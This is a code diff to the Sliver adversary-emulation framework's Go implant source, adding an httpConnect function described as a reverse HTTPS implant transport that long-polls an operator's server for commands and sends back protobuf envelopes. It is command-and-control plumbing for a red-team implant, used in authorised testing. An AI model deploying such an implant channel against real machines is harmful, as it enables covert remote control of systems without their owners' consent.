@@ -38,18 +38,17 @@ import (
 	"io"
 	"io/ioutil"
 	insecureRand "math/rand"
-	"strings"
-
-	"sync"
-	// {{if .Config.Debug}}
-	"log"
-	// {{end}}
-
 	"net"
 	"net/http"
 	"net/url"
 	"path"
+	"strings"
+	"sync"
 	"time"
+
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/encoders"
@@ -62,6 +61,97 @@ const (
 	defaultNetTimeout = time.Second * 60
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 )
+
+// httpConnect - Reverse HTTPS implant transport.
+func httpConnect(uri *url.URL) (*Connection, error) {
+
+	// {{if .Config.Debug}}
+	log.Printf("Connecting -> http(s)://%s", uri.Host)
+	// {{end}}
+	client, err := HTTPStartSession(uri.Host)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("http(s) connection error %v", err)
+		// {{end}}
+		return nil, err
+	}
+
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[http] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			data, _ := proto.Marshal(envelope)
+			// {{if .Config.Debug}}
+			log.Printf("[http] send envelope ...")
+			// {{end}}
+			go client.Send(data)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			select {
+			case <-ctrl:
+				return
+			default:
+				resp, err := client.Poll()
+				switch err := err.(type) {
+				case nil:
+					envelope := &pb.Envelope{}
+					proto.Unmarshal(resp, envelope)
+					if err != nil {
+						continue
+					}
+					recv <- envelope
+				case net.Error:
+					if err.Timeout() {
+						// {{if .Config.Debug}}
+						log.Printf("non-fatal error, continue")
+						// {{end}}
+						continue
+					}
+					return
+				case *url.Error:
+					if err, ok := err.Err.(net.Error); ok && err.Timeout() {
+						// {{if .Config.Debug}}
+						log.Printf("non-fatal error, continue")
+						// {{end}}
+						continue
+					}
+					return
+				default:
+					// {{if .Config.Debug}}
+					log.Printf("[http] error: %#v", err)
+					// {{end}}
+					return
+				}
+			}
+		}
+	}()
+
+	return connection, nil
+}
 
 // HTTPStartSession - Attempts to start a session with a given address
 func HTTPStartSession(address string) (*SliverHTTPClient, error) {
